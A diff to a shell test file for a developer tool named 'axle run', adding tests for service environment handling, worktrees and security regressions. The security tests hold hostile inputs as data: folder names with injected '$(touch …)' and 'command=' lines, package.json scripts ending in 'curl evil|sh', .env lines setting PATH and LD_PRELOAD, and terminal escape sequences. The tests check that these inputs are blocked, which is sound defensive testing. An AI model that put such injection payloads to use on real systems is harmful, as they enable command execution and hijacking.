@@ -1,4 +1,4 @@
-# axle run (docs/legionary/ROADMAP.md). M0: which project, its root, and why.
+# axle run: which project, its root, and why.
 
 # A history log line: hist <seconds ago> <dir>
 hist() {
@@ -152,7 +152,7 @@ test_run_detects_each_sample() {
     "gin|go run . | service | 9090 | go · gin"
     "go-http|go run . | service | 8081 | go · net/http"
     "go-cli|go run . | task |  | go"
-    "static|$py -m http.server 8000 | service | 8000 | static site"
+    "static|$py -I -m http.server 8000 | service | 8000 | static site"
     "nothing|none"
   )
   local c
@@ -568,7 +568,7 @@ test_run_port_ways() {
     "django|9001|python3 manage.py runserver 9001"
     "streamlit|--server.port|python3 -m streamlit run streamlit_app.py --server.port 9001"
     "vite|pnpm: --port|pnpm run dev --port 9001"
-    "static|last word|python3 -m http.server 9001"
+    "static|last word|python3 -I -m http.server 9001"
   )
   local py=python; whence -p python3 >/dev/null && py=python3
   for c in $cases; do
@@ -1150,7 +1150,7 @@ test_run_set_port_is_given_to_the_server() {
   cd $T/site
   axle run set port 8123 >/dev/null
   local out=$(axle run --dry-run)
-  assert_contains "$out" "run    python3 -m http.server 8123" "the command gets it"
+  assert_contains "$out" "run    python3 -I -m http.server 8123" "the command gets it"
   assert_contains "$out" "service on http://localhost:8123"
   _axle_run_detect $T/site; _axle_run_trust_key $T/site; local with=$REPLY
   axle run set port >/dev/null
@@ -1884,5 +1884,157 @@ test_run_procfile_processes() {
   axle run logs -x >/dev/null 2>&1 && fail "an unknown option"
   axle run stop >/dev/null 2>&1
   [[ -d $HOME/.local/state/axle/run/services/shop-worker ]] && fail "stopped with the project"
+  return 0
+}
+
+# axle run sh / exec: a shell or a command with what the service gets (here's, or a running
+# one's as it was started), in its folder; the command's own exit status.
+test_run_sh_and_exec() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/app
+  print '<!doctype html>' > $T/app/index.html
+  print -rl -- 'SECRET=one' 'export MODE="dev"' > $T/app/.env
+  cd $T/app
+  assert_eq "$(axle run exec sh -c 'echo "$PWD|$SECRET|$MODE|$PORT"')" "$T/app|one|dev|8000" "here's"
+  axle run exec sh -c 'exit 7'; assert_eq $? 7 "its exit status"
+  axle run exec >/dev/null 2>&1 && fail "a command is needed"
+  local out; out=$(print -r -- 'echo "in:$SECRET:$AXLE_RUN_SHELL"; exit' | SHELL=/bin/sh axle run sh 2>&1)
+  assert_contains "$out" "in:one:app"
+  # A running service's, as it was started (its port, not the detected one).
+  web_project $port || return 0
+  print -r -- 'SECRET=web' > $T/web/.env
+  typeset -ga _axle_run_envfiles=($T/web/.env)
+  _axle_run_start $T/web web; wait_state web up
+  cd $T
+  assert_eq "$(axle run exec -s web sh -c 'echo "$PWD|$SECRET|$PORT"')" "$T/web|web|$port" "the service's"
+  axle run exec -s nope true >/dev/null 2>&1 && fail "no such service"
+  axle run stop web >/dev/null
+  return 0
+}
+
+# When a service's .env changes, it starts again with the new values (not a crash);
+# AXLE_RUN_ENV_RELOAD=0: not.
+test_run_restarts_when_env_changes() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/w
+  print -r -- 'SECRET=one' > $T/w/.env
+  typeset -ga _axle_run_cmd=(sh -c 'while :; do echo "secret=$SECRET"; sleep 0.2; done') _axle_run_envfiles=($T/w/.env)
+  typeset -g _axle_run_kind=service _axle_run_port='' _axle_run_worker=1
+  local dir=$HOME/.local/state/axle/run/services/w
+  _axle_run_start $T/w w; wait_state w up
+  local pid=$(<$dir/pid)
+  sleep 1.1; print -r -- 'SECRET=two' > $T/w/.env
+  local -i i
+  for i in {1..80}; do [[ $(<$dir/log) == *secret=two* ]] && break; sleep 0.1; done
+  assert_contains "$(<$dir/log)" "secret=two" "started again with the new value"
+  assert_contains "$(<$dir/log)" ".env changed: starting w again"
+  [[ $(<$dir/pid) == $pid ]] && fail "a new process"
+  [[ -s $dir/restarts && $(<$dir/restarts) != 0 ]] && fail "not counted as a crash"
+  axle run stop w >/dev/null
+  # Off: left as it is.
+  print -r -- 'SECRET=one' > $T/w/.env
+  AXLE_RUN_ENV_RELOAD=0 _axle_run_start $T/w w; wait_state w up
+  pid=$(<$dir/pid)
+  sleep 1.1; print -r -- 'SECRET=three' > $T/w/.env; sleep 3
+  assert_eq "$(<$dir/pid)" $pid "AXLE_RUN_ENV_RELOAD=0: not restarted"
+  axle run stop w >/dev/null
+  return 0
+}
+
+# Git worktrees: a second checkout runs as <project>@<branch>, and gets the next free port
+# when the first has its port, unasked.
+test_run_git_worktrees() {
+  AXLE_MODULES=(run) load_tool
+  whence -p git >/dev/null || return 0
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  git init -q $T/shop
+  print -r -- "web: $py $ROOT/tests/serve.py \$PORT" > $T/shop/Procfile
+  print -r -- "PORT=$port" > $T/shop/.env
+  git -C $T/shop add -A; git -C $T/shop commit -qm one
+  git -C $T/shop worktree add -q -b feat/x $T/.trees/x 2>/dev/null || return 0
+  local -a reply
+  _axle_run_projname $T/shop; assert_eq $REPLY shop "the main checkout"
+  _axle_run_projname $T/.trees/x; assert_eq $REPLY shop@feat-x "a worktree: project@branch"
+  cd $T/shop; axle run --yes </dev/null > $T/out 2>&1 || fail "first: $(<$T/out)"
+  wait_state shop up
+  cd $T/.trees/x; axle run --yes </dev/null > $T/out 2>&1 || fail "second: $(<$T/out)"
+  assert_contains "$(<$T/out)" "another checkout of this project"
+  wait_state shop@feat-x up
+  [[ $(<$HOME/.local/state/axle/run/services/shop@feat-x/port) != $port ]] || fail "another port"
+  axle run stop all >/dev/null
+  return 0
+}
+
+# Security: what the review found stays fixed.
+# A folder's name in the history log can't fake a record whose numbers run code.
+test_security_history_folder_names() {
+  AXLE_MODULES=(run) load_tool
+  local evil=$'x\npath[$(touch '$T$'/pwned)]\t0\t0\t.'
+  mkdir -p "$T/$evil" || return 0
+  cd "$T/$evil"; _axle_hist_record 0 0.1 'ls'; cd $T
+  local -i i; for i in 1 2 3; do _axle_hist_record 0 0.1 ls; done
+  _axle_jump_rank >/dev/null 2>&1; _axle_run_recent >/dev/null 2>&1
+  axle history 50 >/dev/null 2>&1
+  [[ -e $T/pwned ]] && fail "a folder name ran code"
+  return 0
+}
+
+# A part folder with a newline in its name can't write a setting (command=...).
+test_security_part_names() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/p/web "$T/p/"$'w\ncommand=touch '$T'/pwned'
+  print '<!doctype html>' > $T/p/web/index.html
+  print '<!doctype html>' > "$T/p/"$'w\ncommand=touch '$T'/pwned/index.html'
+  local -a reply; _axle_run_parts $T/p
+  [[ "$reply" == *command=* ]] && fail "not a part: $reply"
+  _axle_run_choice_save $T/p web "$T/p/"$'w\ncommand=x' 2>/dev/null
+  _axle_run_yours_get $T/p command && fail "no setting from a name"
+  return 0
+}
+
+# package.json: the top-level scripts as npm reads them (not a decoy, the last of two, with
+# \" inside), and predev shown and approved with dev.
+test_security_package_json() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/n
+  print -r -- '{"config":{"scripts":{"dev":"vite"}},"scripts":{"predev":"echo pre","dev":"vite","dev":"vite --x \"0\" ; curl evil"},"devDependencies":{"vite":"5"}}' > $T/n/package.json
+  _axle_run_detect $T/n
+  assert_contains "$_axle_run_source" 'predev: echo pre | vite --x "0" ; curl evil'
+  assert_contains "$_axle_run_reason" 'curl evil'
+  # A control character in it is shown, not sent to the terminal.
+  print -r -- $'{"scripts":{"dev":"curl evil|sh #\e[2K\\rvite"}}' > $T/n/package.json
+  _axle_run_detect $T/n
+  [[ $_axle_run_reason == *$'\e'* ]] && fail "no escape in what's shown"
+  return 0
+}
+
+# .env can't set PATH or LD_PRELOAD for the command you approved; restart checks the
+# command is still the one approved; logs reach the terminal without escape sequences.
+test_security_env_restart_logs() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/s
+  print -rl -- 'PATH=/evil' 'LD_PRELOAD=/evil.so' 'OK=1' > $T/s/.env
+  local -a reply; _axle_run_envfile $T/s/.env
+  assert_eq "$reply" "OK=1" "only OK"
+  assert_contains "$(cd $T/s && print '<!doctype html>' > index.html && axle run env)" "PATH  not given"
+  # restart: approved, then the script changes.
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  print -r -- "web: $py $ROOT/tests/serve.py $port" > $T/s/Procfile
+  cd $T/s; axle run --yes </dev/null >/dev/null 2>&1; wait_state s up
+  axle run restart s >/dev/null 2>&1 || fail "unchanged: restarts"
+  wait_state s up
+  print -r -- "web: $py $ROOT/tests/serve.py $port # changed" > $T/s/Procfile
+  local out; out=$(axle run restart s 2>&1) && fail "changed: refused"
+  assert_contains "$out" "has changed since you approved it"
+  # Logs: colours kept, a title / clipboard / clear not.
+  print -r -- $'\e[31mred\e[0m \e]0;TITLE\a\e]52;c;eA==\e\\ \e[2J' >> $HOME/.local/state/axle/run/services/s/log
+  out=$(axle run logs s -n 1 | _axle_run_clean 2>/dev/null)
+  out=$(_axle_run_show_log $HOME/.local/state/axle/run/services/s/log)
+  [[ $out == *$'\e]'* || $out == *$'\e[2J'* ]] && fail "no escapes but colours: ${(q+)out}"
+  assert_contains "$out" $'\e[31mred'
+  axle run stop all >/dev/null
   return 0
 }
